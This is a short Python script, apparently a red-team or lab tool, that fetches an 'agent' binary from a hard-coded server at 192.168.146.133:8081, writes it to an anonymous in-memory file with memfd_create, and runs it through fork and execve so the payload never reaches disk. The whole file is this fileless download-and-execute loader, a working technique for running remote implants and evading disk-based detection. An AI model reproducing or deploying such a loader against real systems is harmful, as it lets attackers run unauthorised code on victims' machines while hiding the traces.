import os, requests

args = []

def main():
    # Requesting the agent bytes from the server
    reqAgent = requests.get("http://192.168.146.133:8081/agent")

    if reqAgent.status_code != 200:
        print(f"[ERROR] - Error while requesting the server: {reqAgent.status_code}")
        return

    # Creating file in memory
    fd = os.memfd_create("1", 0)

    # Writing the agent content to the file descriptor
    with open(f"/proc/self/fd/{fd}", "wb") as f:
        f.write(reqAgent.content)

    # Executing the file using execve
    print("[INFO] - Executing agent in memory")
    childPID = os.fork()

    if childPID == -1:
        print("[ERRO] - Could not initiate agent in memory")
        exit()

    elif childPID == 0:
        filePath = f"/proc/self/fd/{fd}"
        args.insert(0, filePath)

        os.execve(filePath, args, dict(os.environ))

main()
